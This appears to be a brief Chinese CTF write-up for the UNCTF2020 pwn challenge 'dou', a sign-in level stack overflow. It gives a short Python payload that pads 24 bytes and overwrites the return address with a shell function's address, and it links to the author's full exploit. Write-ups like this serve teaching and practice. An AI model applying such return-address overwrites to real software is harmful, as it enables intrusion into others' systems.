
## dou
- 题目描述：
- 题目附件：[dou](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/dou/dou)
- 考察点：栈溢出
- 难度：签到

### 程序分析
和上一题一样，不知道为啥出俩

### 解题思路
``` python
sh = 0x4006CD

offset = 24
payload = 'A'*offset
payload += p64(sh)

sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/dou) 

